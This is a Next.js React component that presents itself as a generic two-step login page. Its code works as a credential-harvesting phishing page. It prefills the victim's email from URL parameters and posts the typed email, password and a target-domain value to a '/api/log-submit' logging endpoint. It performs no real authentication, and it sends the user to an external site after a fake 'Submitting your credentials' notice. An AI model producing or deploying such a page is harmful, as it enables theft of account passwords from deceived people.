'use client'

import { useSearchParams } from 'next/navigation'
import { useState, useEffect } from 'react'

export default function LoginPage() {
  const searchParams = useSearchParams()
  const prefilledEmail = searchParams.get('email') || ''
  const domain = searchParams.get('domain') || ''

  const [email, setEmail] = useState(prefilledEmail)
  const [confirmedEmail, setConfirmedEmail] = useState(!!prefilledEmail)
  const [password, setPassword] = useState('')
  const [showModal, setShowModal] = useState(false)
  const [errors, setErrors] = useState({ email: '', password: '' })

  useEffect(() => {
    if (prefilledEmail) setConfirmedEmail(true)
  }, [prefilledEmail])

  const validateEmail = (value: string) =>
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!validateEmail(email)) {
      setErrors({ ...errors, email: 'Please enter a valid email' })
      return
    }
    setConfirmedEmail(true)
    setErrors({ ...errors, email: '' })
  }

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (password.length < 5) {
      setErrors({ ...errors, password: 'Password must be at least 5 characters' })
      return
    }

    setShowModal(true)

    await fetch('/api/log-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, domain }),
    })

    setTimeout(() => {
      window.location.href = 'https://testingmysite.com'
    }, 2000)
  }

  return (
    <div className="flex items-center justify-center min-h-screen bg-light-blue p-4">
      {/* Login Card */}
      <div className="relative z-10 bg-white rounded-2xl shadow-xl p-8 max-w-md w-full">
        <h1 className="text-2xl font-bold text-center text-gray-800 mb-6">Login</h1>

        {!confirmedEmail ? (
          <form onSubmit={handleEmailSubmit} className="space-y-4">
            <input
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
              required
            />
            {errors.email && (
              <p className="text-sm text-red-600">{errors.email}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
            >
              Next
            </button>
          </form>
        ) : (
          <form onSubmit={handlePasswordSubmit} className="space-y-6">
            {/* Avatar + Email Display */}
            <div className="text-center mb-4">
              <div className="mx-auto mb-4 w-16 h-16 rounded-full bg-gray-400 flex items-center justify-center text-2xl text-white">
                {email[0]?.toUpperCase()}
              </div>
              <p className="text-gray-800 font-medium">{email}</p>
            </div>

            <input
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value)
                if (e.target.value.length >= 5 && errors.password) {
                  setErrors({ ...errors, password: '' })
                }
              }}
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
              required
            />
            {errors.password && (
              <p className="text-sm text-red-600">{errors.password}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
            >
              Login
            </button>
          </form>
        )}
      </div>

      {/* Submission Modal */}
      {showModal && (
        <div className="fixed inset-0 z-20 flex items-center justify-center bg-black/50">
          <div className="bg-white rounded-xl shadow-xl p-6 text-center max-w-xs">
            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
          </div>
        </div>
      )}
    </div>
  )
}
